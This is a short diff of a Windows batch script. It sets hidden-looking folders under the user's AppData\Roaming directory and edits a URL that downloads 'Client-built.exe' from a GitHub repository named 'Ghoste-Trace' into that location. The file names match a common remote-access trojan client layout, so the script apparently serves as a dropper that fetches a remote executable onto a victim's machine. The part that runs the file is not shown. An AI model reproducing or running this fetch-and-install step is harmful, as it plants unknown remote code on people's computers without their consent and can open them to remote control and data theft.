@@ -9,7 +9,8 @@ set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "SUBDIR=%APPDATA_PATH%\Roaming\SubDir"
 set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
 set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
-set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
+:: This URL now points directly to the raw file content on GitHub.
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/Client-built.exe"
 
 :: ============================================================================
 :: Execution Flow
